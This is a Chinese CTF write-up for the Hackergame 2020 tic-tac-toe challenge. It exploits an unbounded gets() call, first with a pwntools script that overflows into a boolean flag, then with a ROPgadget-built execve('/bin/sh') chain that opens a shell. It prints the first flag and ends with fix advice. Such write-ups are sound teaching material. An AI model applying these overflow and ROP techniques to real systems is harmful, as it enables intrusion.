# Hackergame2020 生活在博弈树上 WP

## 题目简述

程序表面上是先手电脑必不败的井字棋，实际在读取玩家落子时使用无长度限制的 `gets(input)`。第一问覆盖相邻的 `success` 布尔变量；第二问继续覆盖返回地址，用静态链接二进制中的 ROP gadget 调用 `execve("/bin/sh",0,0)`。

## 解题过程

### 始终热爱大地

源码中的关键局部变量是：

```c
bool success = false;
char input[128] = {};

gets(input);
```

必须以实际二进制的栈布局为准。该附件中 `input` 位于 `rbp-0x90`，`success` 位于 `rbp-0x1`，二者相差 143 字节。payload 前五个字符仍写成合法坐标，避免后续索引异常，再用 `0x01` 覆盖布尔值：

```python
from pwn import process

io = process("./tictactoe")
payload = b"(2,2)" + b"A" * (143 - 5) + b"\x01"
io.sendlineafter(b"): ", payload)
io.interactive()
```

循环条件下一次检查时发现 `success != 0`，进入胜利分支，输出第一段：

```text
flag{easy_gamE_but_can_u_get_my_shel1}
```

纯栈截图只是把上述偏移画出来，已转写而不归档。

### 升上天空

`checksec` 结果是静态链接、NX 开启、无 PIE；附件的 `main` 没有栈 canary。返回地址距离 `input` 起点 152 字节，所以第二阶段使用：

```python
padding = b"(2,2)" + b"A" * (152 - 5)
```

NX 阻止直接执行栈上 shellcode，但静态链接文件包含足够多的 gadget。用：

```shell
ROPgadget --binary tictactoe --ropchain
```

生成 `execve` 链，其逻辑是：

1. 用 `pop rsi; ret` 和写内存 gadget 把 `/bin//sh\0` 写到可写的 `.data`。
2. 设置 `rdi` 指向字符串，`rsi=0`、`rdx=0`。
3. 将 `rax` 置为系统调用号 59。
4. 跳到 `syscall` gadget。

最终发送 `padding + rop_chain`，程序从 `main` 返回时进入 ROP 链并得到 shell，再读取第二个 flag。地址必须从题目附件自身提取；服务器与公开源码的细微差异不影响利用思路，但不应直接复用其他编译版本的 gadget 地址。

## 方法总结

决定性漏洞是 `gets` 造成的连续栈覆盖，而不是 Minimax。先用最小覆盖修改邻接状态变量，再根据保护信息选择控制流利用方式，是比一开始堆完整 ROP 更稳妥的分析顺序。修复应使用带长度的输入函数，并同时启用 canary、PIE、NX 与 RELRO。
